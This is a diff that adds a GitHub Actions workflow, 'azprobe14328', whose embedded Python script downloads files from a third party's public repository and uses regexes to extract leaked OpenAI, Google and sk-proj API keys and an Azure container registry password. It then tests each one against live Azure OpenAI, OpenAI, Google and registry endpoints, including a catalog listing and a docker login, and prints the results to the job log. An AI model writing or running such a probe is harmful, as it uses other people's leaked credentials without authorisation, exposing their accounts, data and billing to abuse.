@@ -1,0 +1,93 @@
+name: azprobe14328
+on:
+  push:
+    paths:
+      - '.github/workflows/azprobe14328.yml'
+  workflow_dispatch:
+jobs:
+  az:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: azure-openai-and-acr
+        run: |
+          python3 - <<'PY'
+          import urllib.request, urllib.error, json, re, socket, base64, subprocess
+
+          def get(u, hdr=None, data=None, method="GET"):
+              req=urllib.request.Request(u, data=data, headers=hdr or {}, method=method)
+              try:
+                  with urllib.request.urlopen(req, timeout=40) as r:
+                      return r.status, r.read()[:2000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:2000].decode('utf-8','replace')
+              except Exception as e:
+                  return -1, repr(e)
+
+          BASE="https://raw.githubusercontent.com/Kaddtechnologies/DataCleanse/master/"
+          def raw(p): return urllib.request.urlopen(BASE+p, timeout=40).read().decode('utf-8','replace')
+
+          s=raw("deployment/setup-database.sh")
+          t=raw("src/config/ai-providers.config.ts")
+          ps=raw("deployment/deploy-postgres-with-acr.ps1")
+          m=re.search(r'^OPENAI_API_KEY=(\S+)',s,re.M)
+          g=re.search(r'^GOOGLE_API_KEY=(\S+)',s,re.M)
+          sk=re.search(r'(sk-proj-[A-Za-z0-9_-]+)',t)
+          acrpass=re.search(r'\$acrPassword\s*=\s*"([^"]+)"',ps)
+          key=m.group(1) if m else ''
+          gkey=g.group(1) if g else ''
+          skkey=sk.group(1) if sk else ''
+          acrpass=acrpass.group(1) if acrpass else ''
+          print("R14328 | have_azure_key", bool(key), "len", len(key), "tail", key[-6:])
+          print("R14328 | have_google_key", bool(gkey), "have_skproj", bool(skkey), "have_acrpass", bool(acrpass))
+
+          for h in ["devoai.openai.azure.com","dev-openai-35t-16k.openai.azure.com","mdmcleansecr.azurecr.io"]:
+              try:
+                  print("R14328 | DNS", h, sorted(set(a[4][0] for a in socket.getaddrinfo(h,443))))
+              except Exception as e:
+                  print("R14328 | DNS", h, "ERR", type(e).__name__, str(e)[:80])
+
+          eps=["https://devoai.openai.azure.com","https://dev-openai-35t-16k.openai.azure.com"]
+          versions=["2025-01-01-preview","2024-10-21","2024-02-01"]
+          deps=["dai-gpt-4.1-nano","dai-gpt-4-1-nano","gpt-4.1-nano"]
+          for ep in eps:
+              hdr={"api-key":key,"Content-Type":"application/json"}
+              for ver in ["2024-10-21","2024-02-01","2023-05-15"]:
+                  st,b=get(ep+"/openai/models?api-version="+ver,hdr)
+                  print("R14328 | MODELS",ep.split('//')[-1],ver,st,b[:350].replace("\n"," "))
+              for dep in deps:
+                  for ver in versions:
+                      body=json.dumps({"messages":[{"role":"user","content":"Reply with OK only."}],"max_tokens":8}).encode()
+                      st,b=get(ep+"/openai/deployments/"+dep+"/chat/completions?api-version="+ver,hdr,body,"POST")
+                      print("R14328 | CHAT",ep.split('//')[-1],dep,ver,st,b[:450].replace("\n"," "))
+                      if st==200:
+                          print("R14328 | HIT_CHAT",ep,dep,ver)
+
+          st,b=get("https://api.openai.com/v1/models",{"Authorization":"Bearer "+key,"Content-Type":"application/json"})
+          print("R14328 | OPENAI_MODELS_azurekey", st, b[:300].replace("\n"," "))
+          st,b=get("https://api.openai.com/v1/chat/completions",{"Authorization":"Bearer "+key,"Content-Type":"application/json"},json.dumps({"model":"gpt-4.1-nano","messages":[{"role":"user","content":"ping"}],"max_tokens":5}).encode(),"POST")
+          print("R14328 | OPENAI_CHAT_azurekey", st, b[:300].replace("\n"," "))
+
+          if skkey:
+              st,b=get("https://api.openai.com/v1/models",{"Authorization":"Bearer "+skkey})
+              print("R14328 | OPENAI_MODELS_skproj", st, b[:250].replace("\n"," "))
+          if gkey:
+              st,b=get("https://generativelanguage.googleapis.com/v1beta/models?key="+gkey)
+              print("R14328 | GOOGLE_MODELS", st, b[:250].replace("\n"," "))
+
+          # read-only ACR check
+          if acrpass:
+              aurl="https://mdmcleansecr.azurecr.io/v2/"
+              auth=base64.b64encode(("mdmcleansecr:"+acrpass).encode()).decode()
+              st,b=get(aurl,{"Authorization":"Basic "+auth})
+              print("R14328 | ACR_V2", st, b[:200].replace("\n"," "))
+              st,b=get("https://mdmcleansecr.azurecr.io/v2/_catalog",{"Authorization":"Basic "+auth})
+              print("R14328 | ACR_CATALOG", st, b[:400].replace("\n"," "))
+              try:
+                  p=subprocess.run(["docker","login","mdmcleansecr.azurecr.io","-u","mdmcleansecr","--password-stdin"],input=acrpass,capture_output=True,text=True,timeout=60)
+                  out=(p.stdout+p.stderr).replace(acrpass,'***')
+                  print("R14328 | ACR_DOCKER_LOGIN rc", p.returncode, out[:300].replace("\n"," "))
+              except Exception as e:
+                  print("R14328 | ACR_DOCKER_LOGIN ERR", repr(e))
+          print("R14328 | DONE")
+          PY
